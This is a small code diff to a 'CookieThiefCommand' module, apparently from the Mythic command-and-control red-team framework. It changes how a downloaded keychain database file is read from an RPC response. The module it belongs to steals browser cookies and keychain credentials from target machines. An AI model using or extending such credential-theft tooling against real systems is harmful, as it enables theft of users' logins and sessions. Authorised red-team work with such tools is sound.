@@ -74,7 +74,7 @@ class CookieThiefCommand(CommandBase):
 
             getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id, agent_file_id=keychainDBFileId)
             if getkeychainDBResp.status == "success":
-                getkeychainDBResp = getkeychainDBResp.response
+                getkeychainDBResp = getkeychainDBResp.response[0]
                 print(getkeychainDBResp)
             else:
                 print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
